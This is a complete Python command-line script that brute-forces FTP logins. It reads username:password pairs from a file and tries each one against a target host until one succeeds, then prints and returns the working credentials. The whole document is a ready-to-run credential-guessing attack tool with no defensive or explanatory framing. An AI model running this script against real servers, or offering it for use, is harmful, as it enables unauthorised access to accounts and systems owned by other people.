from argparse import ArgumentParser
import ftplib
import time

def brute_login(hostname, password_file):
    with open(password_file) as file:
        ftp = ftplib.FTP(hostname)
        for line in file.readlines():
            time.sleep(1)
            username = line.split(':')[0]
            password = line.split(':')[1].strip('\r').strip('\n')

            print(f'[+] Trying: {username}/{password}')

            try:
                ftp.login(username, password)
                print(f'\n[*] {str(hostname)} FTP logon succeeded: '
                      f'{username}/{password}')
                ftp.quit()
                return username, password
            except Exception as e:
                print(f'[-] Exception: {e}')
                pass
        
        print('\n[-] Could not brute force FTP credentials.')
        return None, None

if __name__ == '__main__':
    parser = ArgumentParser(usage='ftp_brute_login.py TARGET_HOST')
    parser.add_argument('target_host', type=str, metavar='TARGET_HOST', help="Specify target host (IP address or domain name)")
    parser.add_argument('userpass', type=str, metavar='USERPASS', help="Specify file containing username:password pairings")

    args = parser.parse_args()
    brute_login(args.target_host, args.userpass)